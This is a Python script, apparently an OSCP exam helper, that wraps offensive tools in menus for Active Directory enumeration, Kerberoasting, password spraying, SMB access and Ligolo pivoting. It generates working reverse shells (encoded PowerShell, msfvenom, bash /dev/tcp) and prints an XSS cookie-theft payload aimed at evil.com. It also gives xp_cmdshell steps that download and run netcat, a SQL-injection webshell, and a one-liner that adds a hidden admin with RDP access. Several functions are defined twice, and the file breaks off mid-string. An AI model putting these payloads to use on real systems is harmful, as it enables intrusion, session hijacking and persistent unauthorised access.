import os
import os
import base64
from colorama import init, Fore, Style  # Import colorama for colored text output

# Initialize colorama
init(autoreset=True)

# Helper function to prompt for output file
def prompt_for_output():
    """Ask the user if they want to save the output to a file."""
    save_output = input("Do you want to save the output to a file? (yes/no): ").lower()
    if save_output == 'yes':
        file_path = input("Enter the full file path to save the output: ")
        return file_path
    return None

# Helper function to run the command and save output if requested
def run_command(command, file_path=None):
    """Run the command and optionally save the output to a file."""
    if file_path:
        command += f" | tee {file_path}"  # Save output to the file and display it.
    os.system(command)

# Helper to prompt for domain user
def prompt_for_user():
    """Ask the user if they want to specify a domain user."""
    use_user = input("Do you want to specify a domain user? (yes/no): ").lower()
    if use_user == 'yes':
        return input("Enter the username: ")
    return None

# Helper to prompt for Domain Controller IP
def prompt_for_dc_ip():
    """Ask the user if they want to specify a DC IP."""
    use_dc_ip = input("Do you want to specify a Domain Controller IP? (yes/no): ").lower()
    if use_dc_ip == 'yes':
        return input("Enter the DC IP address: ")
    return None

# LDAP Search
def ldap_search():
    domain = input("Enter the domain (e.g., example.com): ")
    file_path = prompt_for_output()
    command = f"ldapsearch -x -H ldap://{domain}"
    run_command(command, file_path)

# Windapsearch with DC IP option
def windap_search():
    domain = input("Enter the domain (e.g., example.com): ")
    dc_ip = prompt_for_dc_ip()
    file_path = prompt_for_output()
    command = f"python3 /home/kali/Tools/windapsearch/windapsearch.py -d {domain}"
    if dc_ip:
        command += f" --dc-ip {dc_ip}"
    run_command(command, file_path)

# GetUserSPNs for Kerberos attacks
def get_user_spns():
    domain = input("Enter the domain (e.g., example.com): ")
    username = prompt_for_user()
    dc_ip = prompt_for_dc_ip()
    file_path = prompt_for_output()
    command = f"impacket-GetUserSPNs -request {domain}"
    if dc_ip:
        command += f" -dc-ip {dc_ip}"
    if username:
        command += f" {username}"
    run_command(command, file_path)

# GetNPUsers for ASREPRoasting
def get_np_users():
    domain = input("Enter the domain (e.g., example.com): ")
    dc_ip = prompt_for_dc_ip()
    file_path = prompt_for_output()
    command = f"impacket-GetNPUsers {domain} -no-pass -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames"
    if dc_ip:
        command += f" -dc-ip {dc_ip}"
    run_command(command, file_path)

# Enum4linux enumeration for SMB
def enum4linux():
    ip = input("Enter the IP address of the target: ")
    file_path = prompt_for_output()
    command = f"enum4linux {ip}"
    run_command(command, file_path)

# Gobuster directory brute-forcing with optional wordlists and extensions
def gobuster():
    url = input("Enter the target URL (e.g., http://example.com): ")
    
    # Wordlist selection
    print("Choose a wordlist:")
    print("1. /usr/share/dirb/wordlists/others/best1050.txt")
    print("2. /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt")
    print("3. /usr/share/seclists/Discovery/Web-Content/common.txt")
    print("4. /usr/share/seclists/Discovery/Web-Content/raft-")

    wordlist_choice = input("Enter the number of your wordlist choice (1-4): ")

    if wordlist_choice == '1':
        wordlist = "/usr/share/dirb/wordlists/others/best1050.txt"
    elif wordlist_choice == '2':
        wordlist = "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"
    elif wordlist_choice == '3':
        wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
    elif wordlist_choice == '4':
        raft_type = input("Enter raft wordlist type (e.g., large, medium, small): ")
        wordlist = f"/usr/share/seclists/Discovery/Web-Content/raft-{raft_type}-files.txt"
    else:
        print("Invalid choice. Using default wordlist.")
        wordlist = "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"

    # Ask the user if they want to add file extensions
    use_extensions = input("Do you want to add file extensions? (yes/no): ").lower()
    
    extensions = ""
    if use_extensions == 'yes':
        # Allow user to input multiple extensions as a comma-separated string
        extensions = input("Enter the extensions to search for (comma-separated, e.g., pdf,html,zip): ")
        extensions = extensions.replace(" ", "")  # Remove spaces in case user adds spaces
        extensions = f"-x {extensions}"
    
    # Prompt for output file if needed
    file_path = prompt_for_output()
    
    # Build the Gobuster command
    command = f"gobuster dir -u {url} -w {wordlist} {extensions}"
    
    # Run the command
    run_command(command, file_path)

# FFUF web fuzzing tool with optional wordlist selection
def ffuf():
    url = input("Enter the target URL (e.g., http://example.com): ")

    # Wordlist selection
    print("Choose a wordlist:")
    print("1. /usr/share/dirb/wordlists/others/best1050.txt")
    print("2. /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt")
    print("3. /usr/share/seclists/Discovery/Web-Content/common.txt")
    print("4. /usr/share/seclists/Discovery/Web-Content/raft-")

    wordlist_choice = input("Enter the number of your wordlist choice (1-4): ")

    if wordlist_choice == '1':
        wordlist = "/usr/share/dirb/wordlists/others/best1050.txt"
    elif wordlist_choice == '2':
        wordlist = "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"
    elif wordlist_choice == '3':
        wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
    elif wordlist_choice == '4':
        raft_type = input("Enter raft wordlist type (e.g., large, medium, small): ")
        wordlist = f"/usr/share/seclists/Discovery/Web-Content/raft-{raft_type}-files.txt"
    else:
        print("Invalid choice. Using default wordlist.")
        wordlist = "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
    
    # Prompt for output file if needed
    file_path = prompt_for_output()

    # Build the FFUF command
    command = f"ffuf -u {url}/FUZZ -w {wordlist}"

    # Run the command
    run_command(command, file_path)


# SMB client listing with options for specific credentials or anonymous login
def smb_anonymous_listing():
    ip = input("Enter the IP address of the target: ")

    # Ask the user for credential options: admin:admin, anonymous:anonymous, or leave blank
    print("Choose an authentication method:")
    print("1. Use admin:admin")
    print("2. Use anonymous:anonymous")
    print("3. Leave blank for anonymous login")
    choice = input("Enter your choice (1/2/3): ")

    if choice == '1':
        username = "admin"
        password = "admin"
    elif choice == '2':
        username = "anonymous"
        password = "anonymous"
    else:
        username = ""
        password = ""

    file_path = prompt_for_output()

    # Build the SMB client command with the chosen credentials
    if username and password:
        command = f"smbclient -L {ip} -U {username}%{password}"
    else:
        command = f"smbclient -L {ip} -N"

    # Run the command
    run_command(command, file_path)

# Nmap scan with hostname, domain name, and DNS servers extraction
def nmap_scan():
    ip = input("Enter the IP address or range (e.g., 192.168.1.1): ")
    options = input("Enter any additional Nmap options (or leave blank for default): ")
    file_path = prompt_for_output()

    # Run the Nmap command and capture the output to a temporary file
    temp_output_file = "/tmp/nmap_scan_output.txt"
    command = f"nmap {options} {ip} -oN {temp_output_file}"  # Save output to a temp file
    print(f"Running Nmap command: {command}")
    os.system(command)

    # Parse the output to look for hostnames, domain names, and DNS servers
    print("\n# --- Parsing Nmap Output for Hostnames, Domain Names, and DNS Servers --- #")
    
    hostname = None
    domain_name = None

    with open(temp_output_file, 'r') as f:
        nmap_output = f.readlines()

    for line in nmap_output:
        # Check for hostnames (from "Nmap scan report for" lines)
        if "Nmap scan report for" in line:
            hostname = line.split("for")[1].strip()
            print(f"Hostname found: {hostname}")
        
        # Check for open DNS (Port 53) and possible domain names
        elif "53/tcp" in line or "53/udp" in line:
            print("Port 53 (DNS) open, checking for domain name...")
            dns_info_index = nmap_output.index(line) + 1
            if dns_info_index < len(nmap_output):
                domain_name = nmap_output[dns_info_index].strip()
                print(f"Possible Domain Name found: {domain_name}")
    
    if hostname and not domain_name:
        print("Only a hostname was found. This could be used for LDAP searches if it's part of a domain.")
    elif domain_name:
        print(f"Use the domain name {domain_name} for LDAP searches.")
    
    # Optionally save parsed results
    if file_path:
        with open(file_path, 'w') as output_file:
            output_file.write("# --- Hostnames, Domain Names, and DNS Servers from Nmap Scan ---\n")
            if hostname:
                output_file.write(f"Hostname: {hostname}\n")
            if domain_name:
                output_file.write(f"Domain Name: {domain_name}\n")

    print("\n# --- Nmap Scan Complete --- #")

# Helper function to prompt for output file
def prompt_for_output():
    """Ask the user if they want to save the output to a file."""
    print(Fore.YELLOW + "Do you want to save the output to a file? (yes/no):")
    save_output = input().lower()
    if save_output == 'yes':
        file_path = input(Fore.YELLOW + "Enter the full file path to save the output: ")
        return file_path
    return None

# Helper function to run the command and save output if requested
def run_command(command, file_path=None):
    """Run the command and optionally save the output to a file."""
    if file_path:
        command += f" | tee {file_path}"  # Save output to the file and display it.
    os.system(command)

# Example of a function using colorama
def nmap_scan():
    ip = input(Fore.GREEN + "Enter the IP address or range (e.g., 192.168.1.1): ")
    options = input(Fore.CYAN + "Enter any additional Nmap options (or leave blank for default): ")
    file_path = prompt_for_output()
    command = f"nmap {options} {ip}"
    print(Fore.BLUE + f"Running Nmap command: {command}")
    run_command(command, file_path)

# SMBMap enumeration
def smbmap_scan():
    ip = input("Enter the IP address of the target: ")
    file_path = prompt_for_output()
    command = f"smbmap -H {ip}"
    run_command(command, file_path)

# Bloodhound data collection
def bloodhound_python():
    domain = input("Enter the domain (e.g., example.com): ")
    dc_ip = prompt_for_dc_ip()
    file_path = prompt_for_output()
    command = f"python3 /home/kali/Tools/BloodHound.py/bloodhound.py -d {domain} -u /usr/share/seclists/Usernames/xato-net-10-million-usernames"
    if dc_ip:
        command += f" --dc {dc_ip}"
    run_command(command, file_path)

# Kerbrute password spray attack with Domain Controller option
def kerbrute_password_spray():
    domain = input("Enter the domain (e.g., example.com): ")
    dc_ip = prompt_for_dc_ip()  # Ask for the Domain Controller IP
    password = input("Enter the password to spray: ")
    file_path = prompt_for_output()
    
    # Build the Kerbrute password spray command
    command = f"/home/kali/Tools/kerbrute/dist/kerbrute passwordspray -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames {password}"
    
    # Add DC IP to the command if provided
    if dc_ip:
        command += f" -dc-ip {dc_ip}"
    
    # Run the command
    run_command(command, file_path)

# Kerbrute user enumeration with Domain Controller option
def kerbrute_user_enum():
    domain = input("Enter the domain (e.g., example.com): ")
    dc_ip = prompt_for_dc_ip()  # Ask for the Domain Controller IP
    file_path = prompt_for_output()
    
    # Build the Kerbrute user enumeration command
    command = f"/home/kali/Tools/kerbrute/dist/kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames"
    
    # Add DC IP to the command if provided
    if dc_ip:
        command += f" -dc-ip {dc_ip}"
    
    # Run the command
    run_command(command, file_path)

# CrackMapExec password spray attack with user-defined username/password or defaults
def crackmapexec_password_spray():
    domain = input("Enter the domain (e.g., example.com): ")
    ip = input("Enter the IP address or range (e.g., 192.168.1.1/24): ")
    
    # Ask if the user wants to input a specific username, if not, use the default username list
    username = input("Enter the username (or press Enter to use default username list): ") or "/usr/share/seclists/Usernames/xato-net-10-million-usernames"
    
    # Ask if the user wants to input a specific password, if not, use the default rockyou password list
    password = input("Enter the password (or press Enter to use default rockyou wordlist): ") or "/usr/share/wordlists/rockyou.txt"
    
    # Option to save the output to a file
    file_path = prompt_for_output()
    
    # Build the CrackMapExec command with the provided or default username/password
    command = f"crackmapexec smb {ip} -u {username} -p {password} -d {domain}"
    
    # Run the command
    run_command(command, file_path)

# Ligolo setup for tunneling
def ligolo_setup():
    print("Setting up Ligolo tunneling...")
    
    # Step 1: Set up tuntap interface
    print("Step 1: Creating tuntap interface on Kali...")
    os.system("sudo ip tuntap add user kali mode tun ligolo")
    os.system("sudo ip link set ligolo up")
    
    # Step 2: Run Ligolo proxy on Kali
    port = input("Enter the listening port for Ligolo proxy (default 443): ") or "443"
    command = f"ligolo-proxy -selfcert -laddr 0.0.0.0:{port}"
    os.system(command)
    print(f"Ligolo proxy started on port {port}...")

    # Step 3: User connects Ligolo from target machine
    print("On the target machine, use the following command to connect to Ligolo:")
    kali_ip = input("Enter your Kali machine IP address (e.g., 192.168.x.x): ")
    print(f"Command on the target: .\\ligolo.exe -connect {kali_ip}:{port} -ignore-cert")
    
    # Step 4: Route setup once connection is made
    print("After the connection is made, run 'ifconfig' to get network details.")
    target_network = input("Enter the target network (e.g., 10.10.150.0/24): ")
    
    print("Step 5: Adding the route to the network via tun0 and ligolo...")
    os.system(f"sudo ip route add {target_network} dev tun0")
    os.system(f"sudo ip route add {target_network} dev ligolo")
    
    print("Ligolo tunnel established and route added.")

def snmp_walk():
    # Prompt for the target IP
    ip = input("Enter the target IP address (e.g., 192.168.202.40): ")

    # Ask the user to choose the SNMP walk option
    print("Choose an SNMP Walk option:")
    print("1. Basic SNMP Walk")
    print("2. Extended SNMP Walk")
    choice = input("Enter your choice (1 or 2): ")

    # Determine the command based on the user's choice
    if choice == '1':
        command = f"snmpwalk -v1 -c public {ip}"
    elif choice == '2':
        command = f"snmpwalk -v1 -c public {ip} NET-SNMP-EXTEND-MIB::nsExtendOutputFull"
    else:
        print("Invalid choice, please select 1 or 2.")
        return  # Exit the function if the choice is invalid

    # Prompt for output file if needed
    file_path = prompt_for_output()

    # Run the chosen SNMP walk command
    run_command(command, file_path)

# Ligolo port forwarding with listeners
def ligolo_listeners():
    print("Setting up port forwarding using Ligolo listeners...")

    # Explanation of listener commands
    print("""
       The following commands need to be run **inside the Ligolo console** after the Ligolo connection is established.
    
    listener_add: This will forward traffic from a port on the victim machine to your Kali machine.
    Example: Any connection to port 1234 on the victim will be forwarded to Kali on port 4444.

    Examples of how to use listeners in a multi-machine scenario:

    1. **Enumerating local ports on the pivot host (MS01)**:
       You can forward a service running on the pivot machine (MS01) to Kali.
       - Example: Forward LDAP (port 389) on MS01 to Kali port 1234:
         listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:389
       - This allows you to connect to LDAP on MS01 from Kali by connecting to localhost:1234 on Kali.

    2. **Accessing internal machines (MS02 or DC01)**:
       Use port forwarding to reach services on internal machines not accessible directly.
       - Example: Forward RDP (port 3389) on MS02 to Kali port 5555:
         listener_add --addr 0.0.0.0:5555 --to MS02_IP:3389
       - Now, you can RDP into MS02 by connecting to localhost:5555 on Kali.

    3. **File transfers or reverse shells**:
       Set up listeners to forward ports for file transfers or shells.
       - Example: Forward port 1234 on MS01 to Kali port 4444 for a reverse shell:
         listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
       - This allows the reverse shell on MS01 to connect back to Kali's listener on port 4444.

    Once you have established the Ligolo connection, you can use the following commands in the Ligolo console.
    """)

    listen_port = input("Enter the port to listen on the victim (e.g., 1234): ")
    forward_port = input("Enter the port to forward to on Kali (e.g., 4444): ")

    # Provide instructions for Ligolo console usage
    print(f"""
    Inside the Ligolo console, run the following command:
    
    listener_add --addr 0.0.0.0:{listen_port} --to 127.0.0.1:{forward_port}
    
    To verify the listener, run:
    
    listener_list
    """)

# Shell creation function for OSCP
def create_reverse_shell():
    # Prompt the user for their IP and port
    lhost = input("Enter your IP address (LHOST): ")
    lport = input("Enter the desired port (LPORT): ")

    # Prompt for the target OS and shell type
    print("Choose the target OS and shell type:")
    print("1. PowerShell Encoded Reverse Shell (Windows)")
    print("2. msfvenom 32-bit Windows .exe Reverse Shell")
    print("3. msfvenom 64-bit Windows .exe Reverse Shell")
    print("4. Linux Reverse Shell (bash)")
    
    choice = input("Enter your choice (1/2/3/4): ")

    if choice == '1':
        # PowerShell reverse shell (encoded)
        print("Generating PowerShell Encoded Reverse Shell...")
        encoded_command = generate_powershell_encoded(lhost, lport)
        command = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_command}'
        print(f"PowerShell reverse shell: {command}")
    
    elif choice == '2':
        # msfvenom 32-bit Windows reverse shell
        output_file = input("Enter the output file name (e.g., shell32.exe): ")
        command = f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
        print(f"Generating msfvenom 32-bit Windows reverse shell...")
        os.system(command)
    
    elif choice == '3':
        # msfvenom 64-bit Windows reverse shell
        output_file = input("Enter the output file name (e.g., shell64.exe): ")
        command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
        print(f"Generating msfvenom 64-bit Windows reverse shell...")
        os.system(command)
    
    elif choice == '4':
        # Linux bash reverse shell
        command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        print(f"Linux bash reverse shell: {command}")
    
    else:
        print("Invalid choice, please choose a valid option.")

# Helper function to generate PowerShell encoded reverse shell
def generate_powershell_encoded(lhost, lport):
    # PowerShell reverse shell command
    powershell_cmd = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});' \
                     f'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};' \
                     f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{' \
                     f'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);' \
                     f'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' \
                     f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);' \
                     f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

    # Encode the PowerShell command in Unicode (UTF-16LE) and then Base64
    powershell_bytes = powershell_cmd.encode('utf-16le')
    encoded_powershell = base64.b64encode(powershell_bytes).decode('utf-8')
    
    return encoded_powershell
# impacket-psexec function
def impacket_psexec():
    print("Impacket-psexec requires admin rights on the target machine.")
    
    domain = input("Enter the domain (leave blank for WORKGROUP): ") or "WORKGROUP"
    username = input("Enter the username: ")
    target_ip = input("Enter the target IP address: ")
    
    print("Do you want to use a password or an NTLM hash?")
    auth_choice = input("Enter '1' for password or '2' for NTLM hash: ")
    
    if auth_choice == '1':
        password = input("Enter the password: ")
        command = f"impacket-psexec {domain}/{username}:{password}@{target_ip}"
    elif auth_choice == '2':
        ntlm_hash = input("Enter the NTLM hash (e.g., aad3b435b51404eeaad3b435b51404ee:password_hash): ")
        command = f"impacket-psexec {domain}/{username}@{target_ip} -hashes {ntlm_hash}"
    else:
        print("Invalid choice. Please select '1' or '2'.")
        return

    print(f"Running command: {command}")
    os.system(command)

# impacket-smbexec function
def impacket_smbexec():
    print("Impacket-smbexec does NOT require admin rights but may fail without sufficient privileges.")
    
    domain = input("Enter the domain (leave blank for WORKGROUP): ") or "WORKGROUP"
    username = input("Enter the username: ")
    target_ip = input("Enter the target IP address: ")
    
    print("Do you want to use a password or an NTLM hash?")
    auth_choice = input("Enter '1' for password or '2' for NTLM hash: ")
    
    if auth_choice == '1':
        password = input("Enter the password: ")
        command = f"impacket-smbexec {domain}/{username}:{password}@{target_ip}"
    elif auth_choice == '2':
        ntlm_hash = input("Enter the NTLM hash (e.g., aad3b435b51404eeaad3b435b51404ee:password_hash): ")
        command = f"impacket-smbexec {domain}/{username}@{target_ip} -hashes {ntlm_hash}"
    else:
        print("Invalid choice. Please select '1' or '2'.")
        return

    print(f"Running command: {command}")
    os.system(command)

## evil-winrm function
def evil_winrm():
    print("Evil-WinRM requires the user to be part of the WinRM group (Remote Management Users) on the target machine.")

    target_ip = input("Enter the target IP address: ")
    username = input("Enter the username: ")
    
    print("Do you want to use a password or an NTLM hash?")
    auth_choice = input("Enter '1' for password or '2' for NTLM hash: ")
    
    if auth_choice == '1':
        password = input("Enter the password: ")
        command = f"evil-winrm -i {target_ip} -u {username} -p {password}"
    elif auth_choice == '2':
        ntlm_hash = input("Enter the NTLM hash (e.g., aad3b435b51404eeaad3b435b51404ee:password_hash): ")
        command = f"evil-winrm -i {target_ip} -u {username} -H {ntlm_hash}"
    else:
        print("Invalid choice. Please select '1' or '2'.")
        return

    print(f"Running command: {command}")
    os.system(command)

# BloodHound useful queries for OSCP
def bloodhound_queries():
    print("Useful BloodHound Queries for OSCP:")
    print("\n# --- Built-in Queries --- #")
    print("* Find Workstations where Domain Users can RDP")
    print("* Find Servers where Domain Users can RDP")
    print("* Find Computers where Domain Users are Local Admin")
    print("* Shortest Path to Domain Admins from Owned Principals")
    print("* Find All Domain Admins\n")

    print("# --- Manual Queries --- #")
    print("Find all computers:")
    print('MATCH (m:Computer) RETURN m\n')

    print("Find all domain users:")
    print('MATCH (m:User) RETURN m\n')

    print("Display all active sessions:")
    print('MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p\n')

    print("Find users with admin rights on computers:")
    print('MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name\n')

    print("Find users with GenericAll or GenericWrite on computers:")
    print('MATCH (u:User)-[:GenericAll|GenericWrite]->(c:Computer) RETURN u.name, c.name\n')

    print("Find users with WriteOwner, WriteDACL, or Owns rights on computers:")
    print('MATCH (u:User)-[:WriteOwner|WriteDACL|Owns]->(c:Computer) RETURN u.name, c.name\n')

    print("Find shortest path to Domain Admins:")
    print('MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS"})) RETURN p\n')

    print("Find users with DCSync rights:")
    print('MATCH (u:User)-[:MemberOf]->(g:Group {name:"DOMAIN ADMINS"}) '
          'WHERE (u)-[:HasControl]->(:Domain {name:"DOMAIN"}) RETURN u.name\n')

    print("Return users that have GenericWrite over Domain Admins group:")
    print('MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:GenericWrite|GenericAll]->(admin:Group {name: "DOMAIN ADMINS"}) '
          'RETURN u.name, g.name, admin.name\n')

    print("Find all Admin accounts with rights over Domain Controller:")
    print('MATCH (u:User)-[:AdminTo|Owns]->(c:Computer {name:"DOMAIN CONTROLLER"}) RETURN u.name, c.name\n')

    print("Find computers where Domain Admins have an active session:")
    print('MATCH (u:User {name:"DOMAIN ADMINS"})-[:HasSession]->(c:Computer) RETURN u.name, c.name\n')

    print("\n# --- Important Reminders --- #")
    print("Don't forget to check:")
    print("- Local Admin rights on important systems")
    print("- Session information on Domain Controllers or critical systems")
    print("- Privileges like DCSync rights or GenericAll/GenericWrite over sensitive objects")
    print("- Shortest path to Domain Admins or any interesting group")

    print("\nThese queries will help identify paths to privilege escalation or lateral movement!")
# MSSQL and MySQL connection function
def db_connection():
    print("Choose the database type:")
    print("1. MSSQL (impacket-mssqlclient)")
    print("2. MySQL")

    db_choice = input("Enter your choice (1 for MSSQL, 2 for MySQL): ")

    if db_choice == '1':
        # MSSQL connection
        username = input("Enter the username: ")
        password = input("Enter the password: ")
        target_ip = input("Enter the target IP address: ")
        
        use_windows_auth = input("Do you want to use Windows Authentication? (yes/no): ").lower()
        if use_windows_auth == 'yes':
            command = f"impacket-mssqlclient {username}:{password}@{target_ip} -windows-auth"
        else:
            command = f"impacket-mssqlclient {username}:{password}@{target_ip}"
        
        print(f"Running command: {command}")
        os.system(command)
    
    elif db_choice == '2':
        # MySQL connection
        username = input("Enter the username: ")
        password = input("Enter the password: ")
        target_ip = input("Enter the target IP address: ")
        
        command = f"mysql -u {username} -p{password} -h {target_ip}"
        
        print(f"Running command: {command}")
        os.system(command)
    
    else:
        print("Invalid choice. Please select '1' for MSSQL or '2' for MySQL.")

# Common web exploitation tips for SQLi, XSS, and file inclusions
def web_exploit_tips():
    print("\n# --- Common SQL Injection Tests --- #")
    print("Basic SQL Injection Test (single quote):")
    print("  ' OR 1=1 --")
    print("Use this in any input field or login form to test for basic SQL injection.")
    
    print("\nBlind SQL Injection Test:")
    print("  ' AND 1=1 -- (Should return normal result)")
    print("  ' AND 1=2 -- (Should return no result)")
    print("Useful when you can't see the output but the query is still executed.\n")

    print("SQL Authentication Bypass:")
    print("  ' OR '1'='1' --")
    print("Use this in login forms where username/password are checked to bypass authentication.\n")

    print("\n# --- Common XSS (Cross-Site Scripting) Tests --- #")
    print("Simple XSS Test:")
    print('  <script>alert("XSS")</script>')
    print("Insert this into input fields or URL parameters to test for reflected or stored XSS.\n")
    
    print("Steal Session Cookie with XSS:")
    print('  <script>document.location="http://evil.com/steal.php?cookie=" + document.cookie</script>')
    print("Use this payload in an XSS-vulnerable input field to steal session cookies.")
    print("This will send the user's session cookie to the attacker's server (http://evil.com/steal.php).\n")

    print("# --- Using the Stolen Session Cookie --- #")
    print("1. Capture the session cookie sent to your server.")
    print("2. In your browser, open the developer console (F12 or right-click -> Inspect).")
    print("3. Navigate to the 'Application' tab, find 'Cookies', and locate the relevant domain.")
    print("4. Replace the session cookie with the stolen cookie value to authenticate as the user.")
    print("\nThis technique allows you to impersonate the victim by using their session cookie.")


    print("\n# --- File Inclusion Vulnerability Tests --- #")
    print("Test for Local File Inclusion (LFI):")
    print("  http://target.com/index.php?page=../../../../etc/passwd")
    print("  http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index")
    print("Test URL parameters for LFI using directory traversal or special PHP streams.\n")
    
    print("Test for Remote File Inclusion (RFI):")
    print("  http://target.com/index.php?page=http://evil.com/shell.txt")
    print("Use this in URL parameters where file inclusions are used to see if remote files can be included.\n")

    print("\n# --- Important Reminders --- #")
    print("Don't forget to test:")
    print("- SQL injection in all input fields, including search boxes, login forms, and URL parameters.")
    print("- Blind SQL injections where you can't see direct output but can observe behavior.")
    print("- XSS in any place where user input is reflected (e.g., search results, error messages).")
    print("- LFI/RFI in URL parameters where file inclusion may occur.")
    print("\nThese common techniques will help you identify potential web vulnerabilities!")


# Function to explain how to enable xp_cmdshell based on different scenarios
def explain_xp_cmdshell_enabling():
    print("\n# --- Enabling xp_cmdshell on MSSQL (with Credentials) --- #")
    print("1. Login to MSSQL (using impacket-mssqlclient or any other SQL client):")
    print("   impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth")
    print("\n2. Enable advanced options and xp_cmdshell:")
    print("""
        EXEC sp_configure 'show advanced options', 1;
        RECONFIGURE;
        EXEC sp_configure 'xp_cmdshell', 1;
        RECONFIGURE;
    """)
    print("3. Run commands using xp_cmdshell, e.g., 'whoami' or 'ipconfig':")
    print("   EXEC xp_cmdshell 'whoami';")
    print("   EXEC xp_cmdshell 'ipconfig';")

    print("\n# --- Using xp_cmdshell for Reverse Shell --- #")
    print("1. Download netcat or other reverse shell binary to the target system using xp_cmdshell:")
    print("   EXEC xp_cmdshell 'curl -o C:\\Windows\\Tasks\\nc64.exe http://192.168.45.246/nc64.exe';")
    print("\n2. Execute the reverse shell:")
    print("   EXEC xp_cmdshell 'C:\\Windows\\Tasks\\nc64.exe 192.168.45.246 4444 -e cmd';")
    
    print("\n# --- Enabling xp_cmdshell via SQL Injection in MSSQL --- #")
    print("1. If vulnerable to SQL injection, you can try enabling xp_cmdshell using injection:")
    print("   admin'; EXEC sp_configure 'show advanced options', 1; --")
    print("   admin'; EXEC sp_configure 'xp_cmdshell', 1; --")
    print("   admin'; EXEC xp_cmdshell 'whoami'; --")

    print("\n# --- MySQL Web Shell Injection Example --- #")
    print("In MySQL, you can't directly enable xp_cmdshell like in MSSQL, but you can use SQL Injection to upload a web shell:")
    print("""
    ' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL INTO OUTFILE '/var/www/html/tmp/webshell.php' --
    """)
    print("Access the webshell via: http://192.168.227.52/tmp/webshell.php?cmd=id")
    print("\nYou can then run commands like 'id' or 'whoami', and even trigger a reverse shell:")
    print("""
    http://192.168.227.52/tmp/webshell.php?cmd=nc -e /bin/bash <attacker_IP> 4444
    """)
    
    print("\n# --- Important Notes --- #")
    print("1. Always verify your permissions before enabling xp_cmdshell, as it requires high privileges (admin rights).")
    print("2. In MSSQL, xp_cmdshell can be useful for lateral movement and executing system commands remotely.")
    print("3. In MySQL, be cautious when using file writes via SQL injection, as it requires writable directories and proper access.")
    print("4. Always ensure the target environment allows outbound connections if you plan to execute reverse shells.")
# Cewl wordlist creation
def create_wordlist_with_cewl():
    print("Cewl Wordlist Creation")

    # Prompt for the target website
    url = input("Enter the target URL (e.g., http://192.168.152.245): ")

    # Ask if the user wants to customize the wordlist generation options
    print("Do you want to set a minimum word length and force lowercase for the wordlist?")
    customize_options = input("Enter 'yes' to customize or 'no' for default options: ").lower()

    if customize_options == 'yes':
        min_word_length = input("Enter the minimum word length (default is 5): ") or "5"
        wordlist_file = input("Enter the output wordlist file name (e.g., wordlist.txt): ")
        command = f"cewl -m{min_word_length} --lowercase -w {wordlist_file} {url}"
    else:
        # Default Cewl command
        wordlist_file = input("Enter the output wordlist file name (e.g., wordlist2.txt): ")
        command = f"cewl -w {wordlist_file} {url}"

    # Run the Cewl command
    print(f"Running Cewl command: {command}")
    os.system(command)
    print(f"Wordlist saved to {wordlist_file}")

# Function to explain adding a user to admin, enabling RDP, and configuring firewall
def explain_rdp_and_admin_setup():
    print("\n# --- Adding User to Administrators and RDP Groups, Enabling RDP and Firewall Configuration --- #\n")
    
    # Adding user and enabling RDP in one line (CMD)
    print("### CMD: One-liner to Add User, Enable RDP, and Configure Firewall ###")
    print('''Command:
net user hacker Hacker123456@ /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
    ''')
    print("\nThis command will do the following:")
    print("1. Create a user called 'hacker' with the password 'Hacker123456@'")
    print("2. Add the user 'hacker' to the 'Administrators' group")
    print("3. Add the user 'hacker' to the 'Remote Desktop Users' group")
    print("4. Modify the registry to allow RDP connections")
    print("5. Open port 3389 for RDP in the firewall")
    print("6. Enable remote admin services for remote management\n")

    # GodPotato command for adding a user
    print("### Using GodPotato to Add User via Command Injection ###")
    print('''Commands:
.\godpotato.exe -cmd "net user test password /add"
.\godpotato.exe -cmd "net localgroup 'Remote Desktop Users' test /add"
.\godpotato.exe -cmd "net localgroup Administrators test /add"
    ''')
    print("\nThese commands use GodPotato to add a new user ('test') and add them to the RDP and Administrators groups.\n")

    # Firewall and registry configuration via CMD
    print("### Disabling Firewall and Enabling RDP via CMD ###")
    print('''Commands:
